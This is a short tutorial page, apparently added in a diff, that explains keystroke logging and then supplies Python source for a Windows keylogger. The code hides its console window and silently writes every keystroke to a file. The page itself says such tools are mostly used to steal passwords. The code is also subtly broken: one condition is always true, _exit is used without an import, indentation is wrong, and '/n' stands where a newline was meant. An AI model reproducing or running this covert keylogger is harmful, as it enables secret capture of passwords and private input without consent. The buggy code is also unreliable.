@@ -1,0 +1,58 @@
+Keystroke logging is the process of recording (logging) the keys pressed on a keyboard (usually when the user is unaware). It is also known as keylogging or keyboard capturing.
+These programs are used for troubleshooting technical problems with computers and business networks. It can also be used to monitor network usages but more often than not it is used for malicious intents like stealing passwords.
+This article illustrates designing a keylogger for windows and Linux.
+ 
+
+Keylogger for Windows
+
+Download some python libraries 
+1) pywin32 
+2) pyhook
+
+Following is the code to create a keylogger in python
+
+import win32api
+import win32console
+import win32gui
+import pythoncom, pyHook
+
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
+def OnKeyboardEvent(event):
+	if event.Ascii==5:
+		_exit(1)
+	if event.Ascii !=0 or 8:
+
+		f = open('c:\output.txt', 'r+')
+		buffer = f.read()
+		f.close()
+
+		f = open('c:\output.txt', 'w')
+		keylogs = chr(event.Ascii)
+		if event.Ascii == 13:
+		keylogs = '/n'
+		buffer += keylogs
+		f.write(buffer)
+		f.close()
+
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+
+hm.HookKeyboard()
+
+pythoncom.PumpMessages()
+#end  of the program
+
+Save the file in C:\ as Keylogger.py and run the python file 
+Output: 
+The keylogger will be started in the background and save all the data on the log file “c:\output.txt”.
+
+
+
+
+
+
+
+
+
